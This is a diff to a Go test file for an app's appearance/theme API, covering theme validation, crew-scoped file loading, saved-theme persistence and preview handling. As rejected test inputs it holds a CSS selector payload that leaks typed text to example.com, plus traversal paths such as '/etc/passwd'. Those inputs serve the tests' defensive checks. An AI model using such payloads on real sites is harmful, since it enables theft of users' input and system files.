@@ -97,6 +97,8 @@ func TestAppearanceIsPersonalAndUsesOneValidatedDocument(t *testing.T) {
 		`{"operation":"apply","theme":{"materials":{"hero":{"opacity":0.5}}}}`,
 		`{"operation":"apply","theme":{"materials":{"page":{"blur":4}}}}`,
 		`{"operation":"apply","theme":{"materials":{"panel":{"blur":40}}}}`,
+		// #3085: HTTPS images plus an input-value selector would leak typed text.
+		`{"operation":"apply","theme":{"css":"input[ VALUE^=\"a\"]{background:url(https://example.com/a)}"}}`,
 	} {
 		if got := invoke("owner", body); got.Code != 400 {
 			t.Fatalf("removed scene or invalid material accepted: %s %d", body, got.Code)
@@ -373,6 +375,18 @@ func TestAppearanceLargeCSSFileUsesAdmittedCrewAcrossToolPaths(t *testing.T) {
 			}
 		}
 	}
+	// #3085: in a Crew's own chat an omitted crew_id is that Crew; elsewhere the
+	// refusal names the field to add. script_file uses the same admitted read.
+	f.write(t, externalCommandCrewRoot+"/bg.js", "function render(frame) {}")
+	if _, err := panels.tools["appearance"].exec(ctx, map[string]any{"operation": "apply", "css_file": map[string]any{"path": "theme.css"}, "script_file": map[string]any{"path": "bg.js"}, "theme": map[string]any{"background_script": map[string]any{"fps": 20}}}); err != nil {
+		t.Fatalf("panel file without crew_id: %v", err)
+	}
+	if exported := f.call(t, "owner", "settings", map[string]any{"action": "appearance", "operation": "export"}); !strings.Contains(exported.Body.String(), "function render(frame) {}") {
+		t.Fatal("script_file did not reach background_script")
+	}
+	if missing := f.call(t, "owner", "settings", map[string]any{"action": "appearance", "operation": "apply", "css_file": map[string]any{"path": "theme.css"}}); missing.Code < 400 || !strings.Contains(missing.Body.String(), "crew_id") {
+		t.Fatalf("missing crew_id refusal: %d %s", missing.Code, missing.Body.String())
+	}
 	for _, path := range []string{"../../config/users.json", "/etc/passwd", "https://example.com/theme.css"} {
 		reply := f.call(t, "owner", "settings", map[string]any{"action": "appearance", "operation": "apply", "css_file": map[string]any{"crew_id": "team", "path": path}})
 		if reply.Code < 400 {
@@ -536,5 +550,84 @@ func TestSavingAThemeNeverRemovesOtherSavedThemes(t *testing.T) {
 	}
 	if got := names(invoke(`{"operation":"save","theme":{"name":"D"}}`)); got != "B,C,D" {
 		t.Fatalf("a deleted theme came back: %s", got)
+	}
+	// #3085: delete and rename after a short read keep every other theme too.
+	shortRead := func(names ...string) {
+		saved := []appearanceTheme{}
+		for _, name := range names {
+			theme := defaultAppearanceTheme()
+			theme.Name = name
+			saved = append(saved, theme)
+		}
+		data, _ := json.Marshal(appearanceDocument{Current: defaultAppearanceTheme(), Saved: saved})
+		if err := writeRawFileToWorkspace(t.Context(), path, string(data)); err != nil {
+			t.Fatal(err)
+		}
+	}
+	shortRead("B")
+	if got := names(invoke(`{"operation":"delete","name":"C"}`)); got != "B,D" {
+		t.Fatalf("delete after a short read: %s", got)
+	}
+	shortRead("D")
+	if got := names(invoke(`{"operation":"rename","name":"B","new_name":"E"}`)); got != "D,E" {
+		t.Fatalf("rename after a short read: %s", got)
+	}
+	if got := names(invoke(`{"operation":"save","theme":{"name":"F"}}`)); got != "D,E,F" {
+		t.Fatalf("a deleted or renamed theme came back: %s", got)
+	}
+}
+
+// #3085: preview never touches the saved look or the person's other tabs; the
+// app's diagnostics report reaches tools through read, and tools cannot send one.
+func TestAppearancePreviewAndReportStayOutOfTheSavedLook(t *testing.T) {
+	t.Setenv("HOME", t.TempDir())
+	t.Setenv("AGENTWORKS_STATE_ROOT", t.TempDir())
+	f, _ := newExternalCrewCommandFixture(t)
+	invoke := func(body string) *httptest.ResponseRecorder {
+		r := httptest.NewRequest(http.MethodPut, "/api/appearance", strings.NewReader(body))
+		r = r.WithContext(context.WithValue(t.Context(), UserContextKey, &UserClaims{UserID: "owner-3085"}))
+		w := httptest.NewRecorder()
+		f.api.handleAppearance(w, r)
+		return w
+	}
+	if got := invoke(`{"operation":"save","theme":{"name":"Live"}}`); got.Code != 200 {
+		t.Fatal(got.Body.String())
+	}
+	sub := livefeed.Default.Subscribe()
+	defer livefeed.Default.Unsubscribe(sub)
+	if got := invoke(`{"operation":"preview","theme":{"name":"Trial","colors":{"dark":{"accent":"#ff8800"}}}}`); got.Code != 200 {
+		t.Fatalf("preview: %d %s", got.Code, got.Body.String())
+	}
+	if got := invoke(`{"operation":"import_image"}`); got.Code != 400 {
+		t.Fatal("unhandled screen operation fell through to a save")
+	}
+	report := `{"operation":"report","report":{"theme":"Trial","source":"preview","mode":"dark","at":"2026-11-18T10:00:00Z","dropped":[{"text":"display:none","reason":"hides controls"}],"hooks":{"[data-app-main]":1},"background":{"kind":"none","state":"stopped","fps":0}}}`
+	if got := invoke(report); got.Code != 200 {
+		t.Fatalf("report: %d %s", got.Code, got.Body.String())
+	}
+	if notices, _ := sub.Drain(); len(notices) != 0 {
+		t.Fatal("preview or report published a change")
+	}
+	var doc struct {
+		Current    appearanceTheme            `json:"current"`
+		Saved      []appearanceTheme          `json:"saved"`
+		Preview    *appearanceTheme           `json:"preview"`
+		SavedCount int                        `json:"saved_count"`
+		SavedLimit int                        `json:"saved_limit"`
+		LastReport map[string]json.RawMessage `json:"last_report"`
+	}
+	if json.Unmarshal(invoke(`{"operation":"read"}`).Body.Bytes(), &doc) != nil || doc.Current.Name != "Live" || len(doc.Saved) != 1 || doc.Preview == nil || doc.Preview.Colors["dark"]["accent"] != "#ff8800" || doc.SavedCount != 1 || doc.SavedLimit != 20 || doc.LastReport["preview"] == nil {
+		t.Fatalf("preview changed the saved look or read lost it: %+v", doc)
+	}
+	if got := invoke(`{"operation":"report","report":{"source":"app","mode":"dark","at":"now"}}`); got.Code != 400 {
+		t.Fatal("malformed report accepted")
+	}
+	if got := f.call(t, "owner-3085", "settings", map[string]any{"action": "appearance", "operation": "report", "report": map[string]any{"source": "app"}}); got.Code < 400 {
+		t.Fatal("a tool sent a screen report")
+	}
+	invoke(`{"operation":"end_preview"}`)
+	doc.Preview = nil
+	if json.Unmarshal(invoke(`{"operation":"read"}`).Body.Bytes(), &doc) != nil || doc.Preview != nil || doc.Current.Name != "Live" {
+		t.Fatal("end_preview kept the preview")
 	}
 }
